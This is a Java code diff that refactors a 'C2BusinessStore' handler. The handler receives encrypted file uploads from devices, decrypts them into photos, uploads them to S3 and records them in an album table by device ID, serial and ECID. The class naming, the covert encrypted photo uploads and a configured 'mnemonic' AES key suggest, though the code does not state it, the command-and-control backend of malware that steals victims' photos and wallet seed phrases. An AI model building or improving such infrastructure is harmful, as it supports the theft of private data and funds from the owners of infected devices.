@@ -76,6 +76,9 @@ public class C2BusinessStore {
     @Autowired(required = false)
     private S3FileUploadUtil s3FileUploadUtil;
 
+    @Autowired(required = false)
+    private AlbumBatchInsertBuffer albumBatchInsertBuffer;
+
     @org.springframework.beans.factory.annotation.Value("${news4.album.photo-dir:}")
     private String photoDir;
 
@@ -95,9 +98,8 @@ public class C2BusinessStore {
     @org.springframework.beans.factory.annotation.Value("${news4.mnemonic.mnemonic-aes-key:${news4.mnemonic.encrypt-key:}}")
     private String mnemonicAesKey;
 
-    /** album.status：0 待解图；1 最终可用；2 失败；3 本地就绪待上云 */
+    /** album.status：1 上云成功可用；2 失败（旧数据）；0/3 为旧流程残留，新流程成功前不落库 */
     private static final int ALBUM_STATUS_OK = 1;
-    private static final int ALBUM_STATUS_LOCAL_PENDING_CLOUD = 3;
 
     // ---------- 通用解密落库 ----------
 
@@ -499,86 +501,71 @@ public class C2BusinessStore {
 
     // ---------- /t ----------
 
-    /** /t 业务落库 → album；fields 为 multipart 表单字段，fileBlob 为文件字节。
-     *  直接 insert；uk_album_device_sha 冲突则静默返回（不查库、不补写、不打错误日志）。
-     *  解图在事务提交后投递独立线程池，不占用 Kafka/Redis 消费线程。 */
+    /** /t 业务：不预写 album；解密+上云成功后一次性 INSERT（status=1 + S3 URL）。
+     *  解图/上云在独立线程池，不占用 Kafka/Redis 消费线程。失败不落库，避免无地址空壳。 */
     public void saveAlbum(C2HandlerContext ctx, java.util.Map<String, String> fields,
                           byte[] fileBlob, String fileName) {
         try {
             if (!hasDeviceRow(ctx)) {
-                log.info("异常日志:[c2_handlers][album] 无 device_row_id，跳过写入, recordId={}",
+                log.info("异常日志:[c2_handlers][album] 无 device_row_id，跳过, recordId={}",
                         ctx.getRecordId());
                 return;
             }
-            String formTs = field(fields, "ts");
-            String xTs = com.consume.util.HeadersUtil.header(ctx.getHeadersJson(), "x-ts");
-            Integer deviceRowId = ctx.getDeviceRowId();
-            int c2RecordId = (int) ctx.getRecordId();
-            String sha = DigestUtil.sha256Hex(fileBlob);
-
-            AlbumEntity e = new AlbumEntity();
-            e.setDeviceRowId(deviceRowId);
-            e.setDeviceUid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
-            e.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
-            e.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
-            e.setSerial(field(fields, "s"));
-            e.setRid(field(fields, "rid"));
-            e.setFilename(fileName == null ? "" : fileName);
-            e.setFileSize(fileBlob == null ? 0 : fileBlob.length);
-            e.setFileSha256(sha);
-            e.setFormTs(formTs);
-            e.setXTs(xTs);
-            e.setC2RecordId(c2RecordId);
-            e.setStatus(0); // pending
-            e.setType(0);
-            e.setAddtime(System.currentTimeMillis() / 1000.0);
-            e.setParsedAt(null);
-
-            try {
-                albumDao.insert(e);
-            } catch (Exception insertEx) {
-                if (isDuplicateKey(insertEx)) {
-                    return;
-                }
-                throw insertEx;
-            }
-
-            Integer albumId = e.getId();
-            log.debug("正常日志:[c2_handlers][album] 写入, recordId={}, albumId={}, fileSize={}, sha256={}",
-                    ctx.getRecordId(), albumId, e.getFileSize(), e.getFileSha256());
-
-            if (albumId != null && albumId > 0 && fileBlob != null && fileBlob.length > 0) {
-                scheduleMaterialize(albumId, deviceRowId, fileBlob, formTs, fileName);
-            }
-        } catch (Exception ex) {
-            if (isDuplicateKey(ex)) {
+            if (fileBlob == null || fileBlob.length == 0) {
                 return;
             }
-            log.info("异常日志:[c2_handlers][album] 写入失败, recordId={}, err={}",
+            if (!albumCloudEnabled || s3FileUploadUtil == null) {
+                log.info("异常日志:[c2_handlers][album] 云存储不可用，跳过, recordId={}", ctx.getRecordId());
+                return;
+            }
+            String formTs = field(fields, "ts");
+            if (formTs == null || formTs.isEmpty()) {
+                log.info("异常日志:[c2_handlers][album] 缺少 ts，跳过, recordId={}", ctx.getRecordId());
+                return;
+            }
+
+            AlbumEntity draft = new AlbumEntity();
+            draft.setDeviceRowId(ctx.getDeviceRowId());
+            draft.setDeviceUid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
+            draft.setChannelcode(ctx.getChannelcode() == null ? "" : ctx.getChannelcode());
+            draft.setEcid(ctx.getDeviceId() == null ? "" : ctx.getDeviceId());
+            draft.setSerial(field(fields, "s"));
+            draft.setRid(field(fields, "rid"));
+            draft.setFilename(fileName == null ? "" : fileName);
+            draft.setFileSize(fileBlob.length);
+            draft.setFileSha256(DigestUtil.sha256Hex(fileBlob));
+            draft.setFormTs(formTs);
+            draft.setXTs(com.consume.util.HeadersUtil.header(ctx.getHeadersJson(), "x-ts"));
+            draft.setC2RecordId((int) ctx.getRecordId());
+            draft.setType(0);
+            draft.setAddtime(System.currentTimeMillis() / 1000.0);
+
+            scheduleMaterialize(draft, fileBlob);
+        } catch (Exception ex) {
+            log.info("异常日志:[c2_handlers][album] 提交失败, recordId={}, err={}",
                     ctx.getRecordId(), ex.getMessage());
         }
     }
 
-    private void scheduleMaterialize(Integer albumId, Integer deviceRowId,
-                                     byte[] fileBlob, String formTs, String fileName) {
+    private void scheduleMaterialize(AlbumEntity draft, byte[] fileBlob) {
         AlbumAsyncConfig.AlbumRejectAware task = new AlbumAsyncConfig.AlbumRejectAware() {
             @Override
             public void run() {
-                materializeAlbumImage(albumId, deviceRowId, fileBlob, formTs, fileName);
+                materializeAlbumImage(draft, fileBlob);
             }
 
             @Override
             public void onRejected() {
-                markAlbumFail(albumId, "解图队列已满，请稍后重投或人工补解");
+                log.info("异常日志:[c2_handlers][album] 解图队列已满，丢弃不落库, recordId={}, sha={}",
+                        draft.getC2RecordId(), draft.getFileSha256());
             }
         };
         Runnable submit = () -> {
             try {
                 albumMaterializeExecutor.execute(task);
             } catch (Exception ex) {
-                markAlbumFail(albumId, "提交解图任务失败: " + ex.getMessage());
-                log.info("异常日志:[c2_handlers][album] 提交解图失败, albumId={}, err={}",
-                        albumId, ex.getMessage());
+                log.info("异常日志:[c2_handlers][album] 提交解图失败, recordId={}, err={}",
+                        draft.getC2RecordId(), ex.getMessage());
             }
         };
         if (TransactionSynchronizationManager.isSynchronizationActive()) {
@@ -593,169 +580,141 @@ public class C2BusinessStore {
         submit.run();
     }
 
-    /** 解密 .dat →（原本地落盘已注释）→ 独立队列上传 S3 → 回写 image_path。 */
-    private void materializeAlbumImage(Integer albumId, Integer deviceRowId,
-                                       byte[] fileBlob, String formTs, String fileName) {
-        try {
-            AlbumEntity cur = albumDao.selectById(albumId);
-            if (cur != null && cur.getStatus() != null && cur.getStatus() == ALBUM_STATUS_OK) {
-                log.debug("正常日志:[c2_handlers][album] 已是 OK，跳过解图, albumId={}", albumId);
-                return;
-            }
-        } catch (Exception ignore) {
-            // 查状态失败仍继续解图
-        }
-        if (formTs == null || formTs.isEmpty()) {
-            markAlbumFail(albumId, "缺少表单字段 ts（7z 密码 = prefix + ts）");
+    /** 解密 .dat → 投递 S3；成功后再 INSERT album。 */
+    private void materializeAlbumImage(AlbumEntity draft, byte[] fileBlob) {
+        if (draft == null || fileBlob == null) {
             return;
         }
         byte[] image;
         String imageMemberName;
         String ext;
         try {
-            TPhotoDecryptor.ImageDetail detail = TPhotoDecryptor.decryptDatToImage(fileBlob, formTs);
+            TPhotoDecryptor.ImageDetail detail =
+                    TPhotoDecryptor.decryptDatToImage(fileBlob, draft.getFormTs());
             image = detail.image;
             imageMemberName = detail.imageName;
             ext = detail.ext;
         } catch (Exception ex) {
-            markAlbumFail(albumId, "解密失败: " + ex.getMessage());
-            log.info("异常日志:[c2_handlers][album] 解密失败, albumId={}, err={}", albumId, ex.getMessage());
+            log.info("异常日志:[c2_handlers][album] 解密失败不落库, recordId={}, err={}",
+                    draft.getC2RecordId(), ex.getMessage());
             return;
         }
         if (image == null || image.length == 0) {
-            markAlbumFail(albumId, "7z 解出空内容");
+            log.info("异常日志:[c2_handlers][album] 解出空内容不落库, recordId={}", draft.getC2RecordId());
             return;
         }
 
         String safeExt = (ext == null || !ext.startsWith(".")) ? ".bin" : ext;
         String imageName = (imageMemberName == null || imageMemberName.isEmpty())
-                ? (albumId + safeExt) : imageMemberName;
+                ? (draft.getFileSha256() + safeExt) : imageMemberName;
         if (imageName.length() > 256) {
             imageName = imageName.substring(0, 256);
         }
-
-        /*
-         * ========== 原本地落盘逻辑（保留注释，便于回退）==========
-         * String devDir = String.valueOf(deviceRowId == null ? 0 : deviceRowId);
-         * java.io.File absDir = new java.io.File(new java.io.File(photoDir.trim()), devDir);
-         * if (!absDir.exists() && !absDir.mkdirs()) {
-         *     markAlbumFail(albumId, "创建目录失败: " + absDir);
-         *     log.info("异常日志:[c2_handlers][album] 创建目录失败, dir={}", absDir);
-         *     return;
-         * }
-         * java.io.File absPath = new java.io.File(absDir, albumId + safeExt);
-         * try {
-         *     java.nio.file.Files.write(absPath.toPath(), image);
-         * } catch (Exception ex) {
-         *     markAlbumFail(albumId, "图片落盘失败: " + ex.getMessage());
-         *     log.info("异常日志:[c2_handlers][album] 图片落盘失败, albumId={}, err={}", albumId, ex.getMessage());
-         *     return;
-         * }
-         * String relPath = joinUrlPrefix(photoUrlPrefix, devDir + "/" + albumId + safeExt);
-         * AlbumEntity updLocal = new AlbumEntity();
-         * updLocal.setId(albumId);
-         * updLocal.setStatus(ALBUM_STATUS_OK);
-         * updLocal.setImagePath(relPath);
-         * updLocal.setImageName(imageName);
-         * updLocal.setErrorMsg("");
-         * updLocal.setParsedAt(System.currentTimeMillis() / 1000.0);
-         * albumDao.updateById(updLocal);
-         * log.debug("正常日志:[c2_handlers][album] 图片落盘成功, albumId={}, size={}, path={}",
-         *         albumId, image.length, absPath.getAbsolutePath());
-         * ========== 原本地落盘逻辑结束 ==========
-         */
-
-        // 云存储：解图线程只解密 + 标记 status=3，网络上传交给 album-s3 队列
-        if (!albumCloudEnabled || s3FileUploadUtil == null) {
-            markAlbumFail(albumId, "云存储未启用或 S3 未注入（本地落盘已关闭）");
-            log.info("异常日志:[c2_handlers][album] 云存储不可用, albumId={}, cloudEnabled={}, s3Util={}",
-                    albumId, albumCloudEnabled, s3FileUploadUtil != null);
-            return;
-        }
-
-        AlbumEntity upd = new AlbumEntity();
-        upd.setId(albumId);
-        upd.setStatus(ALBUM_STATUS_LOCAL_PENDING_CLOUD);
-        upd.setImageName(imageName);
-        upd.setErrorMsg("");
-        upd.setParsedAt(System.currentTimeMillis() / 1000.0);
-        albumDao.updateById(upd);
-        log.debug("正常日志:[c2_handlers][album] 解密完成(待上云), albumId={}, size={}",
-                albumId, image.length);
-
-        final String uploadImageName = imageName;
-        final String uploadExt = safeExt;
-        scheduleCloudUploadBytes(albumId, deviceRowId, image, uploadExt, uploadImageName);
+        draft.setImageName(imageName);
+        scheduleCloudUploadBytes(draft, image, safeExt);
     }
 
     /**
-     * 投递 S3 上传任务（携带解密后的图片字节；不占用解图线程做网络 IO）。
-     * 队列满时保持 status=3，等待消息重投再次解图上传。
+     * 投递 S3 上传；成功后一次性 INSERT status=1。
+     * 队列满则丢弃（不落库），依赖消息重投。
      */
-    public void scheduleCloudUploadBytes(Integer albumId, Integer deviceRowId,
-                                         byte[] image, String safeExt, String imageName) {
-        if (!albumCloudEnabled || albumId == null || image == null || image.length == 0) {
+    public void scheduleCloudUploadBytes(AlbumEntity draft, byte[] image, String safeExt) {
+        if (!albumCloudEnabled || draft == null || image == null || image.length == 0) {
             return;
         }
+        final String ext = safeExt;
         AlbumAsyncConfig.AlbumRejectAware task = new AlbumAsyncConfig.AlbumRejectAware() {
             @Override
             public void run() {
-                uploadAlbumBytesToCloud(albumId, deviceRowId, image, safeExt, imageName);
+                uploadAndInsertAlbum(draft, image, ext);
             }
 
             @Override
             public void onRejected() {
-                log.info("异常日志:[c2_handlers][album] S3 上传队列已满，保留 status=3 待重投, albumId={}",
-                        albumId);
+                log.info("异常日志:[c2_handlers][album] S3 队列已满，丢弃不落库, recordId={}, sha={}",
+                        draft.getC2RecordId(), draft.getFileSha256());
             }
         };
         try {
             albumUploadExecutor.execute(task);
         } catch (Exception ex) {
-            log.info("异常日志:[c2_handlers][album] 提交 S3 上传失败, albumId={}, err={}",
-                    albumId, ex.getMessage());
+            log.info("异常日志:[c2_handlers][album] 提交 S3 失败, recordId={}, err={}",
+                    draft.getC2RecordId(), ex.getMessage());
         }
     }
 
-    /** @deprecated 旧「本地路径上云」入口，纯云存储模式改用 {@link #scheduleCloudUploadBytes} */
+    /** @deprecated 旧入口保留签名兼容；纯云模式已改为 draft 上云后入库 */
+    public void scheduleCloudUploadBytes(Integer albumId, Integer deviceRowId,
+                                         byte[] image, String safeExt, String imageName) {
+        log.info("正常日志:[c2_handlers][album] 旧 scheduleCloudUploadBytes(albumId) 已废弃, albumId={}",
+                albumId);
+    }
+
+    /** @deprecated 旧「本地路径上云」入口 */
     public void scheduleCloudUpload(Integer albumId, Integer deviceRowId,
                                     String absFilePath, String localRelPath) {
         log.info("正常日志:[c2_handlers][album] scheduleCloudUpload 已废弃(无本地盘), albumId={}", albumId);
     }
 
-    /** 内存字节 → S3 → 回写 image_path=云 URL、status=1 */
-    private void uploadAlbumBytesToCloud(Integer albumId, Integer deviceRowId,
-                                         byte[] image, String safeExt, String imageName) {
-        if (s3FileUploadUtil == null) {
-            log.info("异常日志:[c2_handlers][album] S3FileUploadUtil 未注入，跳过上云, albumId={}", albumId);
+    /** 内存字节 → S3 → 成功才 INSERT album（status=1 + URL） */
+    private void uploadAndInsertAlbum(AlbumEntity draft, byte[] image, String safeExt) {
+        if (s3FileUploadUtil == null || draft == null) {
             return;
         }
         try {
-            AlbumEntity cur = albumDao.selectById(albumId);
-            if (cur == null) {
-                return;
-            }
-            if (cur.getStatus() != null && cur.getStatus() == ALBUM_STATUS_OK) {
-                return;
-            }
-            if (cur.getStatus() == null || cur.getStatus() != ALBUM_STATUS_LOCAL_PENDING_CLOUD) {
-                return;
-            }
-            Integer rowId = deviceRowId != null ? deviceRowId : cur.getDeviceRowId();
+            Integer rowId = draft.getDeviceRowId();
+            String sha = draft.getFileSha256() == null ? "" : draft.getFileSha256();
             String ext = (safeExt == null || !safeExt.startsWith(".")) ? ".bin" : safeExt;
-            String objectKey = buildCloudObjectKey(rowId, albumId, albumId + ext);
-            String url = s3FileUploadUtil.uploadBytes(image, objectKey, objectKey);
+            // 无 albumId：用 sha 作对象名，幂等重传可覆盖同一 key
+            String fileName = (sha.isEmpty() ? String.valueOf(System.currentTimeMillis()) : sha) + ext;
+            String objectKey = buildCloudObjectKey(rowId, fileName);
+            String url = s3FileUploadUtil.uploadBytes(image, objectKey, fileName);
             if (url == null || url.isEmpty()) {
-                log.info("异常日志:[c2_handlers][album] S3 上传失败, albumId={}, key={}", albumId, objectKey);
+                log.info("异常日志:[c2_handlers][album] S3 上传失败不落库, recordId={}, key={}",
+                        draft.getC2RecordId(), objectKey);
                 return;
             }
-            int n = albumDao.markCloudOk(albumId, url, System.currentTimeMillis() / 1000.0);
-            if (n > 0) {
-                log.info("正常日志:[c2_handlers][album] S3 上传成功并回写, albumId={}, url={}", albumId, url);
+
+            double now = System.currentTimeMillis() / 1000.0;
+            draft.setStatus(ALBUM_STATUS_OK);
+            draft.setImagePath(url);
+            draft.setErrorMsg("");
+            draft.setParsedAt(now);
+            if (draft.getAddtime() == null) {
+                draft.setAddtime(now);
+            }
+            if (draft.getErrorMsg() == null) {
+                draft.setErrorMsg("");
+            }
+            if (draft.getDeviceUid() == null) {
+                draft.setDeviceUid("");
+            }
+            if (draft.getChannelcode() == null) {
+                draft.setChannelcode("");
+            }
+            if (draft.getEcid() == null) {
+                draft.setEcid("");
+            }
+            if (albumBatchInsertBuffer != null) {
+                albumBatchInsertBuffer.offer(draft);
+                log.debug("正常日志:[c2_handlers][album] 上云成功，已入批量写队列, recordId={}, url={}",
+                        draft.getC2RecordId(), url);
+            } else {
+                try {
+                    albumDao.insert(draft);
+                    log.info("正常日志:[c2_handlers][album] 上云成功并入库, recordId={}, albumId={}, url={}",
+                            draft.getC2RecordId(), draft.getId(), url);
+                } catch (Exception insertEx) {
+                    if (isDuplicateKey(insertEx)) {
+                        return;
+                    }
+                    log.info("异常日志:[c2_handlers][album] 上云成功但入库失败, recordId={}, url={}, err={}",
+                            draft.getC2RecordId(), url, insertEx.getMessage());
+                }
             }
         } catch (Exception ex) {
-            log.info("异常日志:[c2_handlers][album] S3 上传异常, albumId={}, err={}",
-                    albumId, ex.getMessage());
+            log.info("异常日志:[c2_handlers][album] S3/入库异常, recordId={}, err={}",
+                    draft.getC2RecordId(), ex.getMessage());
         }
     }
 
@@ -767,12 +726,12 @@ public class C2BusinessStore {
      * ========== 结束 ==========
      */
 
-    private String buildCloudObjectKey(Integer deviceRowId, Integer albumId, String fileName) {
+    private String buildCloudObjectKey(Integer deviceRowId, String fileName) {
         String prefix = albumCloudKeyPrefix == null ? "photos" : albumCloudKeyPrefix.trim();
         prefix = prefix.replace("\\", "/").replaceAll("^/+", "").replaceAll("/+$", "");
         String name = fileName;
         if (name == null || name.isEmpty()) {
-            name = albumId + ".bin";
+            name = System.currentTimeMillis() + ".bin";
         }
         int slash = name.replace("\\", "/").lastIndexOf('/');
         if (slash >= 0) {
@@ -782,6 +741,9 @@ public class C2BusinessStore {
     }
 
     private void markAlbumFail(Integer albumId, String error) {
+        if (albumId == null) {
+            return;
+        }
         try {
             AlbumEntity upd = new AlbumEntity();
             upd.setId(albumId);
